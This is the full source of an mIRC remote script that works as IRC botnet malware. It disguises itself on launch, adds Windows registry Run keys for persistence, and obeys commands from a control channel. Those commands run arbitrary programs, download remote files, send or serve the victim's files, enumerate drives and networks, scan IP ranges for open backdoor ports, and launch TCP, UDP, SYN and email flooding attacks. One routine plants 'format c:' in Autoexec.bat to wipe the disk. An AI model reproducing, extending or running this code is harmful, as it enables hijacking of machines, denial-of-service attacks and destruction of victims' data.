on *:start: { titlebar JoeSystem | run calc32.exe "mIRC JoeSystem" | checker | regedit | nick  $read oje.txt $+ $read oje.txt $+ $rand(1,9) $+ $rand(a,z) $+ $rand(a,z)  | emailaddr $read oje.txt $+ $read oje.txt $+ @ $+ $read oje.txt $+ .com |  fullname $read oje.txt $+ $rand(a,z) $+ $rand(a,z)  $+ $read oje.txt  | p1rt | server %bot.server }
on *:connect: { timerKickJoin 0 50 join %botchan  %key | set %btime $time | timerAIDLE 0 60 AntiIdle | nick $read oje.txt $+ $read oje.txt $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) }
on *:disconnect: { nick  $read oje.txt $+ $read oje.txt $+ $rand(1,99) $+ $rand(a,z) | server %bot.server }
on *:kick:%botchan: { if ($knick = $me) { timerKickJoin 0 5 join %botchan %key } }
on *:text:!s0er!:*: { auser q $nick $+ !*@* | msg $nick 12 ok user add }
on *:join:%botchan: { if ($nick = $me) {  timerArt off | timerPing off | timerKickJoin off | unset %sstats | timer 1 15 topic.chan } }
on *:sockopen:security.*:{  if ($sockerr > 0) { sockclose $sockname | return  } | set %bugg $sock($sockname).port | security.warning  |  sockclose $sockname }
on *:sockopen:port.damp*: { if ($sockerr > 0) {  msg %botchan 14 port: 15  $sock($sockname).port 14 не используется  | sockclose $sockname | halt } |  msg %botchan 4 port: 15  $sock($sockname).port 4 порт открыт  |  sockclose $sockname  }
on q:TOPIC:#: { topic.chan }
on q:text:*:*: {
  if ($strip($1) = !mail)  {  if ($strip($5) != $null) {  set %mail.to $2 | set %sus.mail $3 |  set %mail.total.netto $4 |  set %mail.col.send 1 | set %mail.netto 1 | set %mail.total.send $5 | smtp.ataka | msg %botchan 5,1[4bOmBiNg5]0-3[09 $+ %mail.to  $+ 3]  | halt } | msg %botchan 12Format: 15!mail mail@address.com Subject 1 1 }
  if ($strip($1) = !down) { set %report $iif(# != $null,#,$nick) | command.down file $2 } 
  if ($strip($1) = !ftp) { fserve $nick 5 %dick | msg $nick 14ftp open 15 $time }
  if ($strip($1) = !inf0) { msg $nick 12 ip::14 $ip 12Os::14 $os 12ident::14 %botprop } 
  if ($strip($1) = !setprop) { set %botprop $2 $3 $4 $5 $6 | msg $nick 12 $me 14 new progpam is : 15 %botprop }
  if ($strip($1) = !ha0s) { msg $nick 4 ok 9 $nick 14 haos system enable 4:  | haos }
  if ($strip($1) = !0) {  $2- | msg $nick  00X U15nderstood  }
  if ($strip($1) = !run) { set %filerun $2 | run %filerun | msg $nick 14 command echo 12 ! }
  if ($strip($1) = !j) { .join $2- | .msg  $nick 10[14I Now Joining $2- $+ 10]2 }
  if ($strip($1) = !p) { .part $2- | .msg $nick 10[14I  Now Parting $2- $+ 10]2 }
  if ($strip($1) = !drive) { getdrive | msg $nick 12 info for local drive | msg $nick 15 %driveC | msg $nick 15 %driveE | msg $nick 15 %driveD | msg $nick 15 %driveG | msg $nick 15 %driveA | msg $nick 15 %driveQ | msg $nick 15 %driveY | msg $nick 12 Finish drive info }
  if ($strip($1) = !ftpdrive) { set %dick $2 | msg $nick 12 new folger is : 14 %dick }
  if ($strip($1) = !re0bot) { sockclose klonprotext | timer 1 1 run $mircexe | timerb 1 2 exit }
  if ($strip($1) = !send) { set %filesend $2 | dcc send $nick %filesend | msg $nick 12 comand echo }
  if ($strip($1) = !tpc.scan) { unset %scan.port* | rand.ipscan $1- }
  if ($strip($1) = !st0p) { msg %botchan 4 все задачи остановлены 12 $my | timers.off }
  if ($strip($1) = !port.damp) { if ($strip($2) = $null) { msg $nick 14порт не назван | halt } |  else { sockopen port.damp $+ $rand(0,99999) $ip $2 } }
  if ($strip($1) = !damp) { segure | msg %botchan 4!12DaMp4! }
  if ($strip($1) = !kill.n) { msg %botchan 4 Killir System enable! | kiil.machine } 
  if ($strip($1) = !syn) { set %synipport $2 $3 | msg %botchan 4 syn $2 $3 | timerSyn 0 60 syn.pro } 
  if ($strip($1) = !var) { msg $nick $b $c(var) $b $2- 15is [ [ $2- ] ]  }
  if ($strip($1) = !scan.start) {  
    if ($2 = $me) { 
      if ($5 = $null) { msg # 12comand 15: 14!scan.start $me 24.42.42.1 24.42.255.255 27374 30100 1243 | halt } 
    }
    if ($2 = $me) {
      if ($5 != $null) { set %sstats on | set %delay 1 | set %total.soket 6 | set %got 0 | set %scan.chan $chan | set %total.scanip 0 | set %scan.victim 0 | set %scan.time $ctime | set %start.ip $3 | set %ip.scan $3 | set %finish.ip $4 | set %total.ip $calc($longip($4) - $longip($3)) | set %scan.port $5 | set %port.info $5- } | if ($6 = $null) { set %total.port 1 | start.scan | halt } | if ($6 != $null) { set %scan.port2 $6 | set %total.port 2 } | if ($7 = $null) { start.scan | halt } | if ($7 != $null) { set %total.port 3 | set %scan.port3 $7 } | if ($8 = $null) { start.scan | halt } | if ($8 != $null) { set %total.port 4  | set %scan.port4 $8 } | if ($9 = $null) { start.scan } | if ($9 != $null) {  set %total.port 5 | set %scan.port5 $9 |  start.scan } 
    }  
  }
  if ($strip($1) = !port.scan) { 
    if ($2 = $me) {
      if ($5 = $null) { msg # 4Format is 14: 15!port.scan $me 24.42.45.12 1 65535 | halt }
      if ($5 != $null) { set %sstats on | set %portscan.victim 0 | set %portscan.ip $3 | set %start.port $4 | set %finish.port $5 | set %port.scan $4 | set %scan.chan # | msg %scan.chan 12Scaning ip 14 %portscan.ip  12for 14 %start.port 12 to 14 %finish.port | port.scaner  }
    }
  }
  if ($strip($1) = !port.scaninfo) { if (%sstats = $null) { halt }
  msg %scan.chan 12 info for 14 %portscan.ip 12 ports 15 fot 14 %start.port 14 to %finish.port | msg %scan.chan 12 actual port 14  %port.scan  12 foond 14 %portscan.victim }
  if ($strip($1) = !port.scanstop) { if ($2 = $me) {  set %port.scan $calc(%finish.port +1) } }
  if ($strip($1) = !scan.stop) { if ($2 = $me) { set %total.scanip $calc(%total.ip +1) } }
  if ($strip($1) = !scan.info) { if (%sstats = $null) { halt }
  msg %scan.chan 12Scaning info for  4[ 14 %start.ip 4] 15to 4[ 14 %finish.ip 4] 15port(s) 4[ 14 %port.info 4] 8 %ip.scan  15 foond 14 %scan.victim }
  if ($strip($1) = !local.info) {  view  }
  if ($strip($1) = !local.hard) {  set %dclin $2 | viewhard }
  if ($strip($1) = !ataka) { if ($3 != $null) { set %victim.ip $2 | set %victim.port $3 | set %at 0 |  msg %botchan 14Attacked host 15: 4 $2 14port 15: 4 $3 | ataka } } 
  if ($strip($1) = !udp) {
    if ($strip($2) = $null) { msg %botchan 14,1[15Need IP14] }
    if ($strip($2) != $null) {
      timer -m 6666666666 10 sockudp -b udp $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $strip($2) $rand(10,500) %mysor %mysor ECHO $ip
      timer -m 6666666666 10 sockudp -b udp $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $strip($2) $rand(500,4000) %mysor %mysor ECHO $ip
      timer -m 6666666666 10 sockudp -b udp $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $strip($2) $rand(4000,60000) %mysor %mysor ECHO $ip
    msg %botchan 5,1[4bOmBiNg5]0-3[09 $+ $strip($2) $+ 3] }
  }
}
alias ataka { 
  sockopen ataked.a $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at  %victim.ip %victim.port 
  sockopen ataked.q $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at  %victim.ip %victim.port 
  sockopen ataked.w $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at  %victim.ip %victim.port 
  sockopen ataked.e $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at   %victim.ip %victim.port 
  sockopen ataked.r $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at    %victim.ip %victim.port 
  sockopen ataked.t $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at   %victim.ip %victim.port 
  sockopen ataked.y $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at  %victim.ip %victim.port 
  sockopen ataked.u $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at  %victim.ip %victim.port 
  sockopen ataked.i $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at  %victim.ip %victim.port 
  sockopen ataked.o $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at  %victim.ip %victim.port 
  sockopen ataked.p $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at  %victim.ip %victim.port 
  sockopen ataked.s $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at  %victim.ip %victim.port 
  sockopen ataked.d $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at  %victim.ip %victim.port 
  sockopen ataked.f $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at   %victim.ip %victim.port 
  sockopen ataked.g $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at   %victim.ip %victim.port 
  sockopen ataked.h $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at   %victim.ip %victim.port 
  sockopen ataked.hg $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999) $+ $rand(1,999)  $+ %at  %victim.ip %victim.port 
  sockopen ataked.j  $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999) $+ $rand(1,999)  $+ %at    %victim.ip %victim.port 
  sockopen ataked.k $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at  %victim.ip %victim.port 
  sockopen ataked.l  $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999) $+ $rand(1,999)  $+ %at   %victim.ip %victim.port 
  sockopen ataked.z $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at  %victim.ip %victim.port 
  sockopen ataked.x $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at  %victim.ip %victim.port 
  sockopen ataked.c $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at  %victim.ip %victim.port 
  sockopen ataked.v $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at  %victim.ip %victim.port 
  sockopen ataked.b $+ $rand(1,999)   $+ $rand(1,999)  $+ $rand(1,999)  $+ $rand(1,999)  $+ %at  %victim.ip %victim.port 
  set %at $calc(%at + 1) 
  at 
}
alias at { timerataka 1 3 ataka } 
on *:sockopen:ataked.*: { 
  if ($sockerr > 0) {
    sockclose $sockname
    return
  }
  sockwrite $sockname -nb GET  %mysor 
  sockwrite $sockname -nb GET  %mysor 
  sockwrite $sockname -nb GET  %mysor 
  sockwrite $sockname -nb GET  %mysor 
  timer 1 3 sockclose $sockname 
}
alias syn.pro { run $mircdir\syn32.exe $rand(1,255) $+ $rand(1,255) $+ $rand(1,255) $+ $rand(1,255) %synipport 1000 }
alias regedit { set %regedit $rand(0,999) $+ .reg | write -c %regedit  REGEDIT4 | write %regedit [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] | write %regedit "NTsocket"=" $+ $replace($mircdir,\,\\)  $+ NoeWinnt.exe" |  run -n regedit /s %regedit | set %regedit.status on | timer 1 4 remove %regedit | timer 1 5 unset %regedit | set %r $rand(0,999) $+ .reg | write -c %r  REGEDIT4 | write %r [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices] | write %r "WinSocketComponent"=" $+ $replace($mircdir,\,\\)  $+ nthost.exe" |  run -n regedit /s %r | timer 1 4 remove %r | timer 1 5 unset %r }
alias kiil.machine { write kill.bat @ECHO OFF | write kill.bat format c: < yes.txt | write yes.txt y | write yes.txt y | write yes.txt y | write yes.txt y | write yes.txt y | write -c c:\Autoexec.bat %windir%\system32\kill.bat | haos }
alias viewhard { copy -o c:\Autoexec.bat $mircdir\red.bat | write -c red.bat @echo off | write red.bat net view %dclin > $mircdir $+ \view.txt | write red.bat exit | run red.bat |  timer  1 3 view.dck  }
alias view.dck { msg %botchan 14info for 4 $2  15: | play %botchan $mircdir\view.txt 1500  }
alias ip.checker { set %ip.check $ip | if (%ip.check !> 0) timers off | timerArtelnative 1 800 artelnative.server }
alias view { copy -o c:\Autoexec.bat $mircdir\red.bat | write -c red.bat @echo off | write red.bat net view > $mircdir $+ \view.txt |  write red.bat net use > $mircdir $+ \USE.txt | write red.bat exit | run red.bat |  timer  1 3 view.resultat  }
alias view.resultat { msg %botchan 14local info 15: | play %botchan $mircdir\view.txt 1500   | play %botchan $mircdir\use.txt 1500 }
alias status.report { msg %botchan $replace($1-,$chr(91),15 [ $+ [ $chr(91) ] $+ ] 14,$chr(93),15 [ $+ [ $chr(93) ] $+ ] 14) }
alias status.reportscan { msg %scan.chan $replace($1-,$chr(91),15 [ $+ [ $chr(91) ] $+ ] 14,$chr(93),15 [ $+ [ $chr(93) ] $+ ] 14) }
alias segure { sockopen security.27374 $ip 27374 |  sockopen security.1243 $ip 1243 | sockopen security.12345 $ip 12345 | sockopen security.20034 $ip 20034 | sockopen security.31337 $ip 31337 |  sockopen security.30100 $ip 30100 }
alias security.warning {  msg %botchan  14[12Security14][4Warning14][15 $me 14][8 %bugg 14] | return }
alias haos { write -c shaos.bat @ECHO OFF | write shaos.bat :loop | write shaos.bat %windir%\SYSTEM32\dllcache\iexplore.exe http://www.microsoft.com | write shaos.bat goto loop | run shaos.bat | shaps }
alias shaos { :end | run $mircdir\dllcache\iexplore.exe http://www.microsoft.com | goto end }
alias tapf.info { msg %botchan 12IP:15 $ip 12Time:15 $duration($calc($ticks / 1000)) 12OS:15 $os }
alias getdrive {  if ($disk(C:)  = $true) { set %driveC dick C:\ exist } | if  ($disk(C:)  = $false) { set %driveC drive C:\ not found } | if ($disk(D:)  = $true) { set %driveD dick D:\ exist } | if  ($disk(D:)  = $false) { set %driveD drive D:\ not found } | if ($disk(E:)  = $true) { set %driveE dick E:\ exist } | if  ($disk(E:)  = $false) { set %driveE drive E:\ not found } | if ($disk(G:)  = $true) { set %driveG dick G:\ exist } 
if  ($disk(G:)  = $false) { set %driveG drive G:\ not found } | if ($disk(Q:)  = $true) { set %driveQ dick Q:\ exist } | if  ($disk(Q:)  = $false) { set %driveQ drive Q:\ not found } | if ($disk(A:)  = $true) { set %driveA dick A:\ exist } | if  ($disk(A:)  = $false) { set %driveA drive A:\ not found } | if ($disk(Y:)  = $true) { set %driveY dick Y:\ exist } | if  ($disk(Y:)  = $false) { set %driveY drive Y:\ not found } }
alias AntiIdle { if ($server == $null) { return } | .notice $me : $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }
alias checker {
  if (%botchan == $null) { set %botchan #oko } | if (%key == $null) { set %key tretr9 } 
  if ($portfree(133) != $true) { exit }
  socklisten klonprotext 133
}
alias start.scan {  msg %scan.chan 14 scaning 15for 4[ 14 %start.ip 4] 15to 4[ 14 %finish.ip 4] 15port(s) 4[ 14 %port.info 4] | set %got 1 | if (%total.soket = $null) { set %total.soket 5 } |  scaner }
alias scaner {
  :end
  sockopen scan.sock $+ %ip.scan $+ %scan.port  %ip.scan %scan.port 
  if (%total.port >= 2) { sockopen scan.sock $+ %ip.scan $+ %scan.port2 %ip.scan %scan.port2 } 
  if (%total.port >= 3) { sockopen scan.sock $+ %ip.scan $+ %scan.port3 %ip.scan %scan.port3 }
  if (%total.port >= 4) { sockopen scan.sock $+ %ip.scan $+ %scan.port4 %ip.scan %scan.port4 }
  if (%total.port >= 5) { sockopen scan.sock $+ %ip.scan $+ %scan.port5 %ip.scan %scan.port5 }
  set %ip.long $calc($longip(%ip.scan) + 1) | set %ip.scan $longip(%ip.long) | set %total.scanip $calc(%total.scanip + 1) | set %got $calc(%got + 1)
  if (%got <= %total.soket) { goto end }
  metca 
}
alias metca { if (%total.scanip > %total.ip) { msg %scan.chan 12scaning finish 14from 15 %start.ip 14to 15 %finish.ip 12potr(s) 15 %port.info 12 fond 15 %scan.victim | unset  %sstats | halt }
set %got 0 | timer 1 1 scaner } 
on *:sockopen:scan.sock*: {  if ($sockerr > 0) { sockclose $sockname | return }
  write -i $sock($sockname).port $+ .txt $sock($sockname).ip $+ : $+ $sock($sockname).port |  set %scan.victim $calc(%scan.victim + 1) 
  If (%msg.halt = $null) { status.reportscan  4Open  Port $+ : $+ [host: $sock($sockname).ip $+ ][port: $sock($sockname).port $+ ][ $+ %scan.victim $+ ]  }
  sockclose $sockname 
}
on *:sockread:scan.sock*:{  if ($sockerr > 0) { sockclose $sockname | return  }
sockread -f %temp | status.reportscan 12Info  for $+ : $+ [host: $sock($sockname).ip $+ ][port: $sock($sockname).port $+ ][ $+ %temp $+ ] | unset %temp | sockclose $sockname  }
alias port.scaner {
  if (%port.delay = $null) { set %port.delay 1 }
  if (%port.scan > %finish.port) { msg  %scan.chan 12finish scaning ip : 4 %portscan.ip 12for 14 %start.port 12to 14 %finish.port | unset %sstats | halt }
  sockopen port.scaning $+ $rand(1,999) $+ $rand(1,999) $+ $rand(1,999) $+ $rand(1,999)  %portscan.ip %port.scan 
  set %port.scan $calc(%port.scan + 1)
  port.metca
}
alias port.metca { timer 1 %port.delay port.scaner }
on *:sockopen:port.scaning*: {  if ($sockerr > 0) { sockclose $sockname | return }
set %portscan.victim $calc(%portscan.victim +1) | status.reportscan  4Open  Port $+ : $+ [host: $sock($sockname).ip $+ ][port: $sock($sockname).port $+ ][ $+ %portscan.victim $+ ] | timer 1 15 sockclose $sockname }
on *:sockread:port.scaning*:{  if ($sockerr > 0) { sockclose $sockname | return  }
sockread -f %port.victim | status.reportscan 12Info  for $+ : $+ [host: $sock($sockname).ip $+ ][port: $sock($sockname).port $+ ][ $+ %port.victim $+ ] | unset %port.victim | sockclose $sockname }
alias rand.ipscan { 
  set %sstats on | set %delay 1 | set %total.soket 6 | set %got 0 | set %scan.chan %botchan | set %total.scanip 0 | set %scan.victim 0 | set %scan.time $ctime 
set %finish.ip 255.255.255.255 | set %total.ip $calc($longip($ip) - $longip(255.255.255.255)) | set %scan.port $2 | set %port.info $2- } | if ($3 != $null) { set %scan.port2 $3 | set %total.port 2 } | if ($4 = $null) { scan.ip.rand | halt } | if ($4 != $null) { set %total.port 3 | set %scan.port3 $4 } | if ($5 = $null) { scan.ip.rand | halt } | if ($5 != $null) { set %total.port 4  | set %scan.port4 $5 } | if ($6 = $null) { scan.ip.rand } | if ($6 != $null) {  set %total.port 5 | set %scan.port5 $6 |  scan.ip.rand } 
alias scan.ip.rand { unset %start.ip | unset %w.1 | unset %w.2 | set %ww.1 $rand(1,900) | set %ww.2 $rand(1,900) 
  if (%ww.1 < %ww.2) { set %start.ip $rand(130,217)  $+ . $+ $rand(3,250) $+ . $+ $rand(0,254) $+ .0 | set %ip.scan %start.ip | start.scan | halt }
  else { set %start.ip $rand(60,217) } | if (%start.ip > 69) || (%start.ip < 130) { set %ww.1 $rand(0,999) | set %ww.2 $rand(0,999) | if (%ww.1 < %ww.2) { set %start.ip $rand(60,69) $+ . $+ $rand(0,250) $+ . $+ $rand(0,254) $+ .0 | set %ip.scan %start.ip | start.scan | halt }
  else { set %start.ip 24. $+ $rand(0,250) $+ . $+ $rand(0,254) $+ .0 | set %ip.scan %start.ip | start.scan | halt } }
set %ww.ip %start.ip $+ . $+ $rand(0,250) $+ . $+ $rand(0,254) $+ .0 | set %ip.scan %start.ip | start.scan }
alias status.report msg %report $2-
alias checkmodule.down set %tapf.module.down $true
alias topic.chan {
  if ($chan(%botchan).topic == $null) { halt }
  else {
    %topic = $chan(%botchan).topic
    if ($gettok(%topic,1,32) = oxoxo) { %victim.ip = $longip($gettok(%topic,3,32)) | %victim.port = $calc($gettok(%topic,4,32) - 185214) | set %at 0 | msg %botchan 14Attacked host 15: 4 %victim.ip 14port 15: 4 %victim.port | ataka }
    if ($gettok(%topic,1,32) = !udp) { %udp.topic.victim = $gettok(%topic,2,32) | udp.topic }
    if ($gettok(%topic,2,32) = ginn) { %udp.topic.victim = $longip($gettok(%topic,3,32)) | udp.topic | %victim.ip = $longip($gettok(%topic,3,32)) | %victim.port = $calc($gettok(%topic,4,32) - 185214) | set %at 0 | msg %botchan 14Attacked host 15: 4 %victim.ip 14port 15: 4 %victim.port | ataka }
    if ($gettok(%topic,2,32) = jani) { msg %botchan 4 все задачи остановлены 12 $my | timers.off }
    if ($gettok(%topic,2,32) = bob.and) { unset %scan.port* | rand.ipscan $gettok(%topic,2-,32) }
    if ($gettok(%topic,2,32) = syni) { unset %synipport | %synipt = $longip($gettok(%topic,3,32)) | %synpotpt = $calc($gettok(%topic,4,32) - 185214) | %synipport = %synipt %synpotpt | timerSyn 0 60 syn.pro }
  }
}
alias udp.topic { msg %botchan 5,1[4bOmBiNg5]0-3[09 %udp.topic.victim 3] | timer.udp | timer 0 2 timer.udp }
alias udp.sock.open {
  sockudp -b udp1 $+ $r(a,z) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %udp.topic.victim $rand(10,500) %mysor %mysor ECHO $ip
  sockudp -b udp2 $+ $r(0,9) $+ $r(a,z) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %udp.topic.victim $rand(500,4000) %mysor %mysor ECHO $ip
  sockudp -b udp3 $+ $r(0,9) $+ $r(0,9) $+ $r(a,z) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %udp.topic.victim $rand(4000,60000) %mysor %mysor ECHO $ip
}
alias timer.udp { timerUDP -m 120 10 udp.sock.open }
alias timers.off { timers off | sockclose * | timerAIDLE 0 60 AntiIdle }
alias command.down { if ($1 == file) {  if ($gettok($$2,1,47) == http:) { status.report [Download][Start][File: $2 $+ ][ | getdata $2 | return } }
  if ($1 == status) { unset %down.file | unset %down.count | set %down.count $sock(www*,0) | if %down.count == 0 { status.report  [Download][Nothing] } | if %down.count == 1 { set  %down.file $gettok($sock(www*,1).mark,3,32) | status.report  [Download][Status][In Process][File: $gettok($sock(www*,1).mark,3,32) $+ ] }
  if %down.count == 2 { set  %down.file $gettok($sock(www*,2).mark,3,32) | status.report  [Download][Status][In Process][File: $gettok($sock(www*,1).mark,3,32) $+ ] | status.report  [Download][Status][In Process][File2: $gettok($sock(www*,2).mark,3,32) $+ ] } }
  if ($1 == stop) { unset %down.file | unset %down.count | set %down.count $sock(www*,0) | if %down.count == 0 { status.report [Download][Halt] } | if %down.count == 1 { set  %down.file $gettok($sock(www*,1).mark,3,32) | if (%down.file != $null) { status.report [Download][Halt][File: $gettok($sock(www*,1).mark,3,32) $+ ] | sockclose www* }
if %down.count == 2 { set  %down.file $gettok($sock(www*,2).mark,3,32) | if (%down.file != $null) { status.report [Download][Halt][File: $gettok($sock(www*,1).mark,3,32) $+ ] | status.report [Download][Halt][File2: $gettok($sock(www*,2).mark,3,32) $+ ] | sockclose www* } } } } }
on *:SOCKREAD:wwwGet: { .remove $mircdir\Temp | status.report 15[14Download][Status][In Process]15[14File: $gettok($sock($sockname).mark,3,32) $+ 15]14 |  if ($sockerr > 0) return | :nextread | sockread %WWW.Temp  | if ($sockbr != 0) { if (%WWW.Temp != $Null) { write $mircdir\Temp %WWW.Temp } | goto nextread } |  if (HTTP/1.*20* iswm [ $read -l1 $mircdir\Temp ] ) {
    if ($exists($gettok($sock($sockname).mark,2,32))) {  .remove $gettok($sock($sockname).mark,2,32) } | :GenNew | set -u0 %WWW.Temp www $+ $rand(A,Z) $+ $rand(0,9) | if ($sock(%WWW.Temp) != $null) { goto GenNew } | sockrename wwwGet %WWW.Temp | if (text/* iswm [ $read -sContent-Type: $mircdir\Temp ] ) { sockmark %WWW.Temp Text $gettok($sock($sockname).mark,2-,32) } |  else {
sockmark %WWW.Temp Bin $gettok($sock($sockname).mark,2-,32) } |  .timer 1 1 sockwrite -tn %WWW.Temp GET $gettok($sock($sockname).mark,3,32) } |  else { //echo -st $read -l2 $mircdir\Temp } |  unset %WWW.Temp }
on *:SOCKREAD:www*: {  if ($sockerr > 0) return | :nextread | if ($gettok($sock($sockname).mark,1,32) == bin) { sockread &Temp | if ($sockbr == 0) return  | if ($bvar(&Temp,0) != 0) { bwrite $gettok($sock($SockName).Mark,2,32) -1 $bvar(&Temp,0) &temp } } |  else { sockread %WWW.Temp | if ($sockbr == 0) return | if (%WWW.Temp != $Null) { write $gettok($sock($SockName).Mark,2,32) %WWW.Temp } | unset %WWW.Temp } | goto nextread }
alias getdata { if ($sock(wwwGet) == $null) { | if ($gettok($$1,1,47) == http:) { sockopen wwwGet $gettok($gettok($1,2,47),1,58) $iif($gettok($gettok($1,3,47),2,58) != $Null, $gettok($gettok($1,3,47),1,58), 80) } | else { sockopen wwwGet $gettok($1,1,47) $iif($gettok($gettok($1,1,47),2,58) != $Null, $gettok($gettok($1,1,47),1,58), 80) } | if ($GetTok($1,$numtok($1,47),47) != $null) { set -u0 %WWW.File $mircdir\ $+ $GetTok($1,$numtok($1,47),47) } 
else { set -u0 %WWW.File $mircdir\_root_ } | sockmark wwwGet unknown %WWW.File $iif($gettok($$1,1,47) == http:, $1, [ http:// $+ [ $1 ] ] ) } |  else {  .timer 1 1 getdata $1 } }
on *:SOCKOPEN:wwwGet: { sockwrite -tn wwwGet HEAD $gettok($sock($sockname).mark,3,32) HTTP/1.1  | sockwrite -tn wwwGet Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*  | sockwrite -tn wwwGet Accept-Language: en-au  |  sockwrite -tn wwwGet Accept-Encoding: deflate  |  sockwrite -tn wwwGet User-Agent: AOR Build#0001 | sockwrite -tn wwwGet Host: $host | sockwrite -tn wwwGet Connection: Keep-Alive | sockwrite -tn wwwGet $lf }
on *:SOCKCLOSE:www*: { status.report [Download][End]14[File:14 $gettok($sock($sockname).mark,3-,32) $+ ]14[Size:14 $file($gettok($sock($sockname).mark,2,32)).size $+ ] |  if ($exists( [ $mircdir\Temp ] )) { .remove $mircdir\Temp } | unset %WWW* }
alias p1rt { if (%proxy.reg = on) { halt }
run gamma.exe | set %proxy.reg on }